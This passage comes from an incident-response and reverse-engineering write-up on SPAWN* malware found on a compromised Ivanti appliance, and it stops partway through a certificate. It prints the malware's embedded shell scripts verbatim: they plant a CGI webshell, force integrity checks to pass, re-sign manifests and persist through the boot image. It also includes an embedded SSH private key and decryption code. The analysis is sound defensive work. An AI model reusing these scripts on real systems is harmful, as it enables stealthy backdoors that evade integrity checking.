find . -type f -printf "%AY-%Am-%Ad-%AH-%AM-%AS %CY-%Cm-%Cd-%CH-%CM-%CS %TY-%Tm-%Td-%TH-%TM-%TS %p\n"
```

Then, sorting the content in any tool capable of sorting ISO time entries like “sort” or “Microsoft Excel” quickly yielded outliers, as well as server update days. In the screenshot below, the last status change time of `/lib/libdsupgrade.so` really stands out, and is highlighted by an internal timestamp coloration tool.

![alt text](image17.png)

Using these timestamps quickly yielded a small set of files which had the same last status change timestamp :

![alt text](image18.png)


These files are:
* `/bin/dsmain` ( SPAWNSNARE , a busybox dropper utility tool )
* `scanner-0.1-py3.6.egg`  ( a backdoored Integrity Checker version )
* `/lib/libdsupgrade.so` ( SPAWNMOLE + SPAWNSNAIL, a backdoor tool )
* `/etc/ld.so.preload` ( Containing /lib/libdsupgrade.so , /lib/libsafe.so and /home/lib/libdspreload.so  , instructing all programs to load the malware before running )
* `/.ssh/known_hosts` ( Created by their backdoor server when the APT connected to the SSH server hooking the web server “accept()” function )


Other files seen touched around the incident time included :
* `nmap`, the network scanner
* Some .pyc Python compiled files related to network scanning, suggesting the use of some Python wrapper of nmap
Below is another screenshot of sorted timestamps showing “nmap” being touched along with other binaries, including /bin/dsmain, a malware file.

![alt text](image19.png)

_Screenshot of file listing showing nmap sharing the same timestamp as /bin/dsmain_


While we did not get an exact timeline of the processes launched by the threat actor and all the command lines they might have used, listing the entirety of the filesystem gave us a pretty clear understanding of events that followed. That is, as soon as the threat actor breached in this server, they started scanning the network, and after 2-3 days of operations they stopped doing anything.


## 1.10 Conclusion of the Incident Response approaches and findings

Performing Incident Response on an appliance is challenging. The vendor-provided ways to investigate the device were lacking exhaustivity and integrity. Analysing the disk contents would not have been possible without extensive preliminary work from other cyber security professionals we have to acknowledge the work of: [nccgroup](https://www.nccgroup.com/us/research-blog/), [watchTowr](https://labs.watchtowr.com/), [NorthWave](https://northwave-cybersecurity.com/resources/insights/how-to-conduct-forensic-investigation-ivanti-devices), [meekochii](https://research.meekolab.com/), [Mandiant](https://cloud.google.com/blog/topics/threat-intelligence/). 

Thanks to their publication initiatives, we knew what to expect from this appliance, and had a procedure to access the data. We only had to arrange logistics, then work our way through layers of filesystem abstractions to find the threat actor malware sample and remnants of operations.
 
# 2 Reverse Engineering APT malware

In this chapter, we will cover the three malware sample files we managed to obtain from the compromised server. This excludes the “scanner” Integrity Scanner altered module, and possibly webshells.

We managed to obtain 3 files, which we mapped to 5 different “SPAWN*” malware family entries as per the Mandiant naming convention.

* `/bin/dsmain` , an installer utility bundling busybox
  * SHA256: b1221000f43734436ec8022caaa34b133f4581ca3ae8eccd8d57ea62573f301d
  * SPAWNSNARE (decryption utility)
  * Type: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.16, with debug_info, not stripped
* `/lib/libdsupgrade.so`, an SSH server hooking the “web” server and the “dsmdm” mobile management service, which contains the liblogblock.so embedded file
  * SHA256: dd091b5a8783eb2cebafe5327d8d7d60ef903e6d062cca1c0549157033072f40
  * SPAWNMOLE (SSH server part)
  * SPAWNANT (liblogblock.so dropper part)
  * SPAWNSNAIL (“dsmdm” injection part)
  * SPAWNCHIMERA (all at once, as per the JPCERT blog post)
  * Type: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.16, stripped
* `/tmp/.liblogblock.so` , a log tampering utility
  * SHA256: 3526af9189533470bc0e90d54bafb0db7bda784be82a372ce112e361f7c7b104
  * SPAWNSLOTH
  * Type: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, stripped


Here is a diagram showing the relations between the several binaries at play in this attack.

![alt text](image20.png)

_Overview of the binaries and their interactions_


To review these files, we will be using the following tools:
* Standard UNIX command-line tools running on Debian GNU/Linux
* IDA Pro
* Malcat
* Docker

Finally, here’s an important reminder:
* **WARNING**
* /!\ Malware analysis safety precautions: only work inside throwaway ephemeral virtual machines without any network capability. /!\

## 2.1 dsmain (SPAWNSNARE) review

This first sample held no secret, it even was not stripped, which means the debugging information such as function names were still inside the binary. Embedded compiler information shows the use of an old Ubuntu and GCC :

* GCC : (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
* GCC : (GNU) 11.2.0

### 2.1.1 Reviewing strings always works

Just after loading any file in IDA Pro, press F12 and you’ll be blessed with the cleartext strings overview, instantly mentioning :
* The presence of `/tmp/extract_vmlinux.sh` , likely to pry the keys out of the Linux kernel
* That it’s busybox, a very common multi-call binary designed as a swiss army knife of programs, to some extent.
 
 ![alt text](image21.png)
 ![alt text](image22.png)
 
### 2.1.2 Function ordering proves useful once again

Inside a binary, functions are usually concatenated by the compiler depending on numerous factors that have the same consequences: hundreds of generic system-level functions are usually at the top of the file, and at the bottom of it as well, leaving some room in the middle for the real malware sauce. Here, the malware authors were kind enough to leave debugging symbols, so next to the “main” function ( which always has to be edited to some extent ) are :

* decrypt_file
* encrypt_file
* swap_bytes
* get_key
* extract_vmlinux

 ![alt text](image23.png)

Along with these function names is the decompiled version of main showing the -g, -e and -d options, likely standing for `get_key`, `encrypt` and `decrypt` respectively.

`extract_vmlinux` itself, when decompiled, is pretty explicit about writing a shell script line by line in a hardcoded location :
 
![alt text](image24.png)


### 2.1.3 Hardcoded encryption keys

Finally, `get_key` had hardcoded XOR keys corresponding to the specific 2.6.32-00049-gb2a3a5b-dirty Linux kernel version. We had found these keys in the Linux kernel earlier while trying to access encrypted disk data.

```C
__int64 __fastcall get_key(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+10h] [rbp-20h] BYREF
  int v3; // [rsp+14h] [rbp-1Ch]
  int v4; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+1Ch] [rbp-14h]
  int m; // [rsp+20h] [rbp-10h]
  int k; // [rsp+24h] [rbp-Ch]
  int j; // [rsp+28h] [rbp-8h]
  int i; // [rsp+2Ch] [rbp-4h]

  if ( strlen(a1) != 32 )
    exit(0);
  for ( i = 0; i <= 3; ++i )
    fprintf_1((const char *)(8 * i + a1), "%8x", &v2 + i);
  for ( j = 0; j <= 3; ++j )
    *(&v2 + j) = swap_bytes((unsigned int)*(&v2 + j));
  v3 ^= 0xAEEF41FE;                             // hardcoded 2.6.32-00049-gb2a3a5b-dirty half-key
  v2 ^= 0x99ED2BF2;
  v4 ^= 0x141058C7u;
  result = v5 ^ 0xD2ED180E;
  v5 ^= 0xD2ED180E;
  for ( k = 0; k <= 3; ++k )
  {
    for ( m = 0; m <= 3; ++m )
    {
      result = 4 * k + m;
      aes_key[result] = *(&v2 + k) >> (8 * m);
    }
  }
  return result;
}
```

Here is the assembly code from the Linux kernel R18.9_2.6.32-00049-gb2a3a5b-dirty.vmlinux , which contains exactly the same 4 uint32 keys :

![alt text](image25.png)

### 2.1.4 Conclusion of the dsmain review

This binary is a utility busybox program designed to:

* Perform a handful of encryption and decryption operations, notably by planting extract-vmlinux in /tmp/extract-vmlinux.sh;
* Extract keys out of the specific R18.9_2.6.32-00049-gb2a3a5b-dirty.vmlinux Linux kernel version;
* Offer capabilities to interact with the encrypted partitions.

## 2.2 libdsupgrade.so ( SPAWNCHIMERA ) review

### 2.2.1 Looking at .data and .rodata yields easy findings

Opening this file with Malcat, and having configured the Mandiant YARA rules for the SPAWN* campaign, we very quickly stumbled on hits that were cleartext strings at the very beginning of the .rodata ( read-only data ) section of the binary.

![alt text](image26.png)
 
_Screenshot of the Malcat GUI showing malicious shell scripts embedded in the binary_

We also noticed that .data contained a magic value `%6PK` followed by what seemed to be a compressed ELF executable file. We could not extract it as-is, and will cover later on how we managed to extract it. At this point, it’s worth noting that amongst the few uint32 present in the .data header, one was conveniently in the few KiB size range, and it turned out to be the expected size of the following data.

![alt text](image27.png)

_Screenshot of the .data section header as viewed in Malcat_

By now, just at looking at sections of the binary supposed to hold data (.rodata and .data) we already expect to find the following features:

* Running a shell script
* Planting an ELF binary

### 2.2.2 Shell script capabilities

This has been already documented, but this SPAWNCHIMERA sample has some embedded shell scripts.
This first one is a sed one-liner replaces the contents of `./do-install` with a script.

```shell
/bin/sed -i '/echo_console "Saving package"/i\ \ cp /lib/%s /tmp/data/root/lib\n\ \ cp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/data/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg\n\ \ echo "/lib/%s ""`/home/bin/openssl dgst -sha256 /lib/%s|cut -d " " -f 2` b" >> /tmp/data/root/home/etc/manifest/manifest\n\ \ sed -i "1i/lib/%s" /tmp/data/root/etc/ld.so.preload\n\ \ touch /tmp/data/root/etc/ld.so.preload\n\ \ sed -i "/ENV{\\"DSINSTALL_CLEAN\\"} = \\\\\\$clean;/a\\ \\ \\\\\\$ENV{\\"LD_PRELOAD\\"} = \\"%s\\";" /tmp/data/root/home/perl/DSUpgrade.pm\n\ \ sed -i "/popen(\\\\*FH, \\\\\\$prog);/a\\ \\ \\\\\\$ENV{\\"LD_PRELOAD\\"} = \\"\\";" /tmp/data/root/home/perl/DSUpgrade.pm\n\ \ sed -i "s/DSUpgrade.pm \\w\\{64\\}/DSUpgrade.pm `/home/bin/openssl dgst -sha256 /tmp/data/root/home/perl/DSUpgrade.pm | cut -d " " -f 2`/" /tmp/data/root/home/etc/manifest/manifest\n\ \ sed -i "/main();/i\if(CGI::param(\\"vXm8DtMJG\\")){\\n\\ \\ print \\"Cache-Control: no-cache\\\\\\\\n\\";\\n\\ \\ print \\"Content-type: text/html\\\\\\\\n\\\\\\\\n\\";\\n\\ \\ my \\\\\\$a=CGI::param(\\"vXm8DtMJG\\");\\n\\ \\ system(\\"\\\\\\$a\\");\\n}\" /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi\n\ \ sed -i "s/compcheckresult.cgi \\w\\{64\\}/compcheckresult.cgi `/home/bin/openssl dgst -sha256 /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi | cut -d " " -f 2`/" /tmp/data/root/home/etc/manifest/manifest\n\ \ sed -i "s/exit 1/exit 0/g" /tmp/data/root/home/bin/check_integrity.sh\n\ \ sed -i "s/check_integrity.sh \\w\\{64\\}/check_integrity.sh `/home/bin/openssl dgst -sha256 /tmp/data/root/home/bin/check_integrity.sh | cut -d " " -f 2`/" /tmp/data/root/home/etc/manifest/manifest\n\ \ /home/bin/openssl genrsa -out private.pem 2048\n\ \ /home/bin/openssl rsa -in private.pem -out manifest.2 -outform PEM -pubout\n\ \ /home/bin/openssl dgst -sha512 -sign private.pem -out manifest.1 /tmp/data/root/home/etc/manifest/manifest\n\ \ mv manifest.1 manifest.2 /tmp/data/root/home/etc/manifest/\n\ \ rm -f private.pem' ./do-install
```

This prefixes the `./do-install` file content with the following script:

```shell
cp /lib/%s /tmp/data/root/lib
cp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/data/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg
echo "/lib/%s ""`/home/bin/openssl dgst -sha256 /lib/%s|cut -d " " -f 2` b" >> /tmp/data/root/home/etc/manifest/manifest
sed -i "1i/lib/%s" /tmp/data/root/etc/ld.so.preload
touch /tmp/data/root/etc/ld.so.preload
sed -i "/ENV{\"DSINSTALL_CLEAN\"} = \\\$clean;/a\ \ \\\$ENV{\"LD_PRELOAD\"} = \"%s\";" /tmp/data/root/home/perl/DSUpgrade.pm
sed -i "/popen(\\*FH, \\\$prog);/a\ \ \\\$ENV{\"LD_PRELOAD\"} = \"\";" /tmp/data/root/home/perl/DSUpgrade.pm
sed -i "s/DSUpgrade.pm \w\{64\}/DSUpgrade.pm `/home/bin/openssl dgst -sha256 /tmp/data/root/home/perl/DSUpgrade.pm | cut -d " " -f 2`/" /tmp/data/root/home/etc/manifest/manifest
sed -i "/main();/iif(CGI::param(\"vXm8DtMJG\")){\n\ \ print \"Cache-Control: no-cache\\\\n\";\n\ \ print \"Content-type: text/html\\\\n\\\\n\";\n\ \ my \\\$a=CGI::param(\"vXm8DtMJG\");\n\ \ system(\"\\\$a\");\n}" /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi
sed -i "s/compcheckresult.cgi \w\{64\}/compcheckresult.cgi `/home/bin/openssl dgst -sha256 /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi | cut -d " " -f 2`/" /tmp/data/root/home/etc/manifest/manifest
sed -i "s/exit 1/exit 0/g" /tmp/data/root/home/bin/check_integrity.sh
sed -i "s/check_integrity.sh \w\{64\}/check_integrity.sh `/home/bin/openssl dgst -sha256 /tmp/data/root/home/bin/check_integrity.sh | cut -d " " -f 2`/" /tmp/data/root/home/etc/manifest/manifest
/home/bin/openssl genrsa -out private.pem 2048
/home/bin/openssl rsa -in private.pem -out manifest.2 -outform PEM -pubout
/home/bin/openssl dgst -sha512 -sign private.pem -out manifest.1 /tmp/data/root/home/etc/manifest/manifest
mv manifest.1 manifest.2 /tmp/data/root/home/etc/manifest/
rm -f private.pem
```

This shell script :
* Plants a webshell in /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi
* Edits the /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi file so that integrity scans report a valid scan output
* Patches /tmp/data/root/home/bin/check_integrity.sh to ensure any integrity check always succeeds.

Another script is planted in `/tmp/installer/do-install-coreboot`:

```shell
/bin/mkdir /tmp/new_img
/bin/dsmain -g
/bin/sh /tmp/extract_vmlinux.sh /tmp/data/root/${kerndir}/bzImage > /tmp/new_img/vmlinux
/bin/rm /tmp/extract_vmlinux.sh
output=$(/bin/dsmain strings -t x /tmp/new_img/vmlinux | grep "Linux version ")
offset="0x"$(echo $output | awk '{print $1}')
offset=$((offset + 0x%x))
key=$(/bin/dsmain xxd -s "$offset" -l 16 -p /tmp/new_img/vmlinux)
/bin/dsmain -d /tmp/data/root/${kerndir}/coreboot.img /tmp/new_img/coreboot.img.1.gz $key
/bin/mkdir /tmp/coreboot_fs
/bin/dsmain gunzip /tmp/new_img/coreboot.img.1.gz -c > /tmp/coreboot_fs/coreboot.img.1
cd /tmp/coreboot_fs
/bin/dsmain cpio -idvm < coreboot.img.1 
/bin/rm coreboot.img.1
cp /bin/dsmain /tmp/coreboot_fs/bin/dsmain
cp /lib/%s /tmp/coreboot_fs/lib/%s
cp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/coreboot_fs/bin/scanner-0.1-py3.6.egg
/bin/sed -i "/rollback_on_error \$? \"Extracting Package \"/a \
/bin/dsmain touch /etc/ld.so.preload\n\
/bin/dsmain sed -i \"1i/lib/%s\" /home/root/etc/ld.so.preload\n\
/bin/cp /bin/dsmain /home/root/bin/dsmain\n\
/bin/cp /bin/scanner-0.1-py3.6.egg /home/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg\n\
/bin/cp /lib/%s /home/root/lib/%s\n\
" /tmp/coreboot_fs/bin/init
/bin/dsmain find . -print | /bin/dsmain cpio -o -H newc > /tmp/new_img/coreboot.img.1
/bin/rm /tmp/new_img/coreboot.img.1.gz
/bin/dsmain gzip /tmp/new_img/coreboot.img.1
/bin/dsmain -e /tmp/new_img/coreboot.img.1.gz /tmp/data/root/${kerndir}/coreboot.img $key
rm -rf /tmp/coreboot_fs
```

This script pulls the key from the Linux kernel using `./bin/dsmain`, and edits the kernel image to achieve persistence across reboots or reinstalls, and patches the integrity scanner.

A fallback method the malware has also uses “sed” to replace any line reporting a problematic finding by “pass”, a special Python programming keyword that does nothing. This prevents the integrity scanner from finding new files or mismatched files.

```C
{
  system("sed -i 's/mismatchCount += 1/pass/g' scripts/scanner.py");
  system("sed -i 's/mismatchedFiles.append(file)/pass/g' scripts/scanner.py");
  system("sed -i 's/newFilesCount += 1/pass/g' scripts/scanner.py");
  system("sed -i 's/newFilesDetected.append(file)/pass/g' scripts/scanner.py");
  system("sed -i 's/mismatchCount += 1/pass/g' scripts/scanner_legacy.py");
  system("sed -i 's/mismatchedFiles.append(file)/pass/g' scripts/scanner_legacy.py");
  system("sed -i 's/newFilesCount += 1/pass/g' scripts/scanner_legacy.py");
  system("sed -i 's/newFilesDetected.append(file)/pass/g' scripts/scanner_legacy.py");
}
```

### 2.2.3 A look at decompiled hook functions

Just a handful of jumps from the entry point and we’re greeted with the following function:

![alt text](image28.png)

_IDA Pro proximity view showing a few jumps from the entry point to 0x6E00_

This function, when decompiled, is pretty clear:
* Either we’re called from `web`, then we hook `accept()` and `strlcpy()`
* Or we’re called form `dsmdm`, then we plant `.liblogblock.so`

```C
void *dsmdm_accept_string()
{
  void *result; // eax
  int v1; // esi
  int newthread[4]; // [esp+0h] [ebp-10h] BYREF

  if ( *_progname == 'w' && _progname[1] == 'e' && _progname[2] == 'b' && !_progname[3] )// w+e+b+\x00 = "web"
  {
    v1 = call_funchook_create();
    init_some_constants();
    result = (void *)call_smalware_plant();
    if ( !result )
    {
      result = dlsym(0, "accept");
      accept_addr = (int)result;
      if ( result )
      {
        result = (void *)call_funchook_prepare(v1, &accept_addr, (int)trampoline_pthread_smth);// Hook #1 on accept()
        if ( !result )
        {
          result = dlsym(0, "strlcpy");
          strlcpy_addr = (int)result;
          if ( result )
          {
            result = (void *)call_funchook_prepare(v1, &strlcpy_addr, (int)backdoor_secret_03970597);// Hook #2 on strlcpy
            if ( !result )
              return (void *)call_funchook_install(v1);
          }
        }
      }
    }
  }
  else
  {
    result = (void *)strcmp(_progname, "dsmdm");// dsmdm injection , this is to plant .liblogblock.so
    if ( !result )
    {
      if ( !pthread_create((pthread_t *)newthread, 0, (void *(*)(void *))dsmdm_injected_MAIN, 0) )
        pthread_detach(newthread[0]);
      return (void *)pthread_create_loblogblock();
    }
  }
  return result;
}
```


Also, the function hook  on strlcpy, thanks to the Hex-Rays decompiler was quickly identified as code searching for the string `03970597` in provided data. We assume this is a set of bytes the threat actor sends to switch from the normal “web” server output to the malicious SSH backdoor server.
 
![alt text](image29.png)

_Screenshot of the Hex-Rays decompilation of 0x7510 showing a byte-by-byte comparison if provided input and hardcoded “03970597”_ 

It’s worth noting that in the screenshot above, at line 27 the characters from the process name (“web”) are summed. The backdoor only activates if the sum is 0x13e = 318 which is the sum of “web” in ASCII:
```python
>>> list(bytes("web","ascii"))
[119, 101, 98]
>>> sum(list(bytes("web","ascii")))
318
```
### 2.2.4 xor-in-loop is a valuable heuristic

In 0x7DD0, the malware sets some environment variables, moves to an appropriate folder, then loads some data from memory, before running XOR operations on it.

 ![alt text](image30.png)


This just XORs data with the index , which is equivalent to using the XOR key `000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff`.

When decrypted, the content of the referenced memory section we named “PRIVATE_KEY_ENC” is as follows, an OpenSSH private key already documented notably by the [JPCERT](https://blogs.jpcert.or.jp/en/2025/02/spawnchimera.html).

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB5yHbNy5qrd638t2dCLQ08TJb3D8m0+vifkGmBRho6+QAAAJB08wxcdPMM
XAAAAAtzc2gtZWQyNTUxOQAAACB5yHbNy5qrd638t2dCLQ08TJb3D8m0+vifkGmBRho6+Q
AAAEBqjrwB7thqk5LnigfsE8EqlKrmWNhy82k5GTV8BBVlDXnIds3Lmqt3rfy3Z0ItDTxM
lvcPybT6+J+QaYFGGjr5AAAACWthbGlAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

Such a decryption operation can be done with a minimal transform function straight in the Malcat GUI, and we’ll later on write a standalone Python script extracting these embedded blobs.

```python
def operation(input:bytes):
    # input: the data, as a bytes buffer
    # return value: a bytes or bytearray buffer
    return bytes(map(lambda i:input[i]^(i%0x100), range(len(input))))
```

![alt text](image31.png)

_Screenshot of the Malcat GUI decrypting a selected range of bytes_

Next to it in memory was an SSH public key encrypted in a similar fashion.

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL3UWhiH4o3SPPg8PSrh0SDNU6BS6N1cAK7Z4cklMW4I kali@kali
```

![alt text](image32.png)

### 2.2.5 x509 certificates are valuable findings

Next to these SSH private and public keys were other binary blobs related to the malicious SSH server configuration. We found three certificates in the .data section, referenced by functions related to the SSH server. With the below Python script, we extracted relevant pieces of data from libdsupgrade.so :

```python
#!/usr/bin/env python3
from pathlib import Path
from collections import namedtuple

def decrypt(data):
    '''Decryption, just XOR bytes with the index number.'''
    return bytes(map(lambda i:data[i]^(i%0x100),range(len(data))))

def identity(data):
    return data

Embedded = namedtuple('Embedded',['filename','offset','size','decryption'])

def main():
    # Read the source file content
    data = Path('libdsupgrade.so').read_bytes()
    # Set of manually identified offsets within the file
    blobs = map(lambda t:Embedded(*t),[
        ['private.key'            , 0x150920 , 399  , decrypt]  ,
        ['public.key'             , 0x150ae0 , 91   , decrypt]  ,
        ['key'                    , 0x150b60 , 241  , identity] ,
        ['cert_vqqN9WszpAMVr.der' , 0x150c60 , 444  , identity] ,
        ['cert_QZf6BD2o46bq4.der' , 0x150e20 , 533  , identity] ,
        ['unknown_integers'       , 0x15106b , 40   , identity] ,
        ['cert_ivanti'            , 0x1510a0 , 1196 , identity] ,
    ])
    # Prepare the output folder
    folder = Path('./extracted/')
    folder.mkdir(parents=True, exist_ok=True)
    # For each file, decrypt ( if needbe ) and write to disk.
    for blob in blobs:
        dest = folder.joinpath(blob.filename)
        RVA_offset = -0x1000 # .data is at 0x1432E0 in file and at 0x1442E0 in memory.
        ws = dest.write_bytes(blob.decryption(data[blob.offset + RVA_offset:blob.offset + blob.size + RVA_offset]))
        print(f'Wrote {ws} bytes in {dest}')

if __name__ == '__main__':
    main()
```

Extracted files are listed below. There are 3 x509 certificates in DER (binary) format, the two keys already mentioned earlier, the unidentified special binaries covered in the next section of this document, as well as a unknown-purpose key.

```shell
$ file *
cert_QZf6BD2o46bq4.der: Certificate, Version=3
cert_ivanti:            Certificate, Version=3
cert_vqqN9WszpAMVr.der: data
key:                    data
private.key:            OpenSSH private key
public.key:             OpenSSH ED25519 public key
unknown_integers:       data
$ head *.key
==> private.key <==
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB5yHbNy5qrd638t2dCLQ08TJb3D8m0+vifkGmBRho6+QAAAJB08wxcdPMM
XAAAAAtzc2gtZWQyNTUxOQAAACB5yHbNy5qrd638t2dCLQ08TJb3D8m0+vifkGmBRho6+Q
AAAEBqjrwB7thqk5LnigfsE8EqlKrmWNhy82k5GTV8BBVlDXnIds3Lmqt3rfy3Z0ItDTxM
lvcPybT6+J+QaYFGGjr5AAAACWthbGlAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----

==> public.key <==
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL3UWhiH4o3SPPg8PSrh0SDNU6BS6N1cAK7Z4cklMW4I kali@kali
```


For reference as well, here are the extracted certificates.

```shell
$ for i in cert* ; do echo $i ; openssl x509 -inform der -in ${i} ; done
cert_QZf6BD2o46bq4.der
-----BEGIN CERTIFICATE-----
MIICETCCAXSgAwIBAgIUelnCmv3BYVkezmZomLtT8Qs2IfEwCgYIKoZIzj0EAwIw
GzEZMBcGA1UEAwwQQ049UVpmNkJEMm80NmJxNDAeFw0yNTAzMTcxMTI0MzdaFw0z
NTAzMTUxMTI0MzdaMBsxGTAXBgNVBAMMEENOPVFaZjZCRDJvNDZicTQwgZswEAYH
KoZIzj0CAQYFK4EEACMDgYYABADr45fxlyCVnunc6OGFl6Dowko4ITiXiKs6OBXN
fvJgeNlg0PMHzcVqx3NZUyNKkNfC7bWxj+OB9yMbZ+zKMGFmlgH/QTLl6B0BjlMd
HkBbnmW/AvQsfejjxSlpPZHxFXa15rNJP/Ne8tRSZSSe5hvVGhFG76SW1IdRhGz5
k/vHOSwN86NTMFEwHQYDVR0OBBYEFDoaUyyNMYsvGr9GF+9VOvvZfru2MB8GA1Ud
IwQYMBaAFDoaUyyNMYsvGr9GF+9VOvvZfru2MA8GA1UdEwEB/wQFMAMBAf8wCgYI
KoZIzj0EAwIDgYoAMIGGAkFU07tPonfyWPSWfb6GtKACVN8vg3Nqg3ubSPnyQw1X
x8RbFUl2uSyufYOZXfBVT9JsAciDQFDRTpce+xbUGeGiGwJBLYIHYQ0kjWYdkU5Q
JOOBozy8EGBy+NkANnfQTFkLQWRKjKfl64++OPb7XH4/UTd98KYpOTy5Q5FCguIY
iPreA4I=
-----END CERTIFICATE-----
cert_ivanti
-----BEGIN CERTIFICATE-----
MIIEqDCCA5CgAwIBAgIIWdOwdKxkMwEwDQYJKoZIhvcNAQELBQAwdTELMAkGA1UE
BhMCPz8xCzAJBgNVBAgMAj8/MQswCQYDVQQHDAI/PzETMBEGA1UECgwKSXZhbnRp
IE9yZzELMAkGA1UECwwCPz8xFzAVBgNVBAMMDnZhMS5JdmFudGkubmV0MREwDwYJ
KoZIhvcNAQkBFgI/PzAeFw0yNDA3MTUxOTM1NTlaFw0zMDAxMDUxOTM1NTlaMHUx
CzAJBgNVBAYTAj8/MQswCQYDVQQIDAI/PzELMAkGA1UEBwwCPz8xEzARBgNVBAoM
Ckl2YW50aSBPcmcxCzAJBgNVBAsMAj8/MRcwFQYDVQQDDA52YTEuSXZhbnRpLm5l
dDERMA8GCSqGSIb3DQEJARYCPz8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQDujupsQiDgn2v+fBlI9epRbE159Z+U7LcH8O/h7bQdzWohQGeO0qyrYmm0
Dnc3jASw/pK3SL1iWo/4SFRc5CY5dhvucZr0CTrQ6I8I1F11jCpwROFVMEgOHoXF
pA629+h2Q0+jQbV7oiO+5dJKVg0RiS3VLzatEw0RQC+bJbFTP8vtKy9eKqQrnABT
lTUqmcjUn3rsLGGT6QYQotcZXmJjYHnoPuPMuPRCsDWDfhRM+jq5VRWiGU15a6a0
J5XxoMHOCFGv0kAkmdsp1GCap2mb6Za8h5DHZzQokfIRJ2j0BBoX/8Bm4OzpT3rg
0xsQ5DkGuxuxB7BoAM9THL51CzqfAgMBAAGjggE6MIIBNjAJBgNVHRMEAjAAMBEG
CWCGSAGG+EIBAQQEAwIGQDAzBglghkgBhvhCAQ0EJhYkT3BlblNTTCBHZW5lcmF0
ZWQgU2VydmVyIENlcnRpZmljYXRlMB0GA1UdDgQWBBRsY5Ve6TazdklALol6jVuK
/lZYZzCBnAYDVR0jBIGUMIGRoXmkdzB1MQswCQYDVQQGEwI/PzELMAkGA1UECAwC
Pz8xCzAJBgNVBAcMAj8/MRMwEQYDVQQKDApJdmFudGkgT3JnMQswCQYDVQQLDAI/
PzEXMBUGA1UEAwwOdmExLkl2YW50aS5uZXQxETAPBgkqhkiG9w0BCQEWAj8/ghQ9
8/fbE/Cn/vIh5BV5SLpO5zNU7jAOBgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYI
KwYBBQUHAwEwDQYJKoZIhvcNAQELBQADggEBAHtoccdrLWcnAZrgMhbSm9XRS7d3
ASrEUQD9bYrlIGElbNCQklFHOnx7Y1YWdZRyy13Pkn9a88AYmSsjgiejl1eQWWtf
VtTELk+AaT98+k3rVA4cZF4QZ/HTbqhsBH3ZewBL567M1Q1UQakyEuWLuvp7r8Zg
UNljfbV93t7g7F8lG8P5DA/8OgTO5awirV4ikIe5d+cUoMQKzPJ8NmBbMdzXWG5q
9sp6nYUYlNGSltRdUNXws9qzPzuA9gPwMiCuO1kcn1zHGgx0s6KnQt98f2/RuSXH
c5iXsTHSOCSdl/aJTQ9ZixNwSBjEHIbJIy82jBnXOMmQ2hIJSVZOUS80p+A=
-----END CERTIFICATE-----
cert_vqqN9WszpAMVr.der
-----BEGIN CERTIFICATE-----
MIIBuDCCARoCFGRS2+oNWCL5b4j3ikBUvKg48qT6MAoGCCqGSM49BAMCMBsxGTAX
BgNVBAMMEENOPVFaZjZCRDJvNDZicTQwHhcNMjUwMzE3MTEyNDM4WhcNMzUwMzE1
MTEyNDM4WjAbMRkwFwYDVQQDDBBDTj12cXFOOVdzenBBTVZyMIGbMBAGByqGSM49
AgEGBSuBBAAjA4GGAAQBVNzsH8rUgZzsUOF9Ae2NJQMPBX6/Ll95Ty4wMBoJG2Xy
2thhTtxK0HRVFJPR938RSttKSe+1iKwP6a6/1ESxOZgBNp7mi+n6Q/5+YXDLY2Ch
BZTsTwpto7/bBhNpTUqiWDoUEbVZUisLQUqBb7SFx1cXDcjpnPqTScd09lTLhw/4
ub8wCgYIKoZIzj0EAwIDgYsAMIGHAkIBTLdJK1U3fWuFgbTP4cxxFqW95aBlWKJY
qW9g1yMShoD37fT/O0n8+1qR63TZXq3fQslaioRUMuxC51bp9kdCp7YCQXvb7JsY
KGUlKPsqMs90WaJDNWMRY6Gls+J+Q7K0cBiyltZChI47uJWzy3jfQjYYCIj24QYa
IYto9wX/VnIxya5O
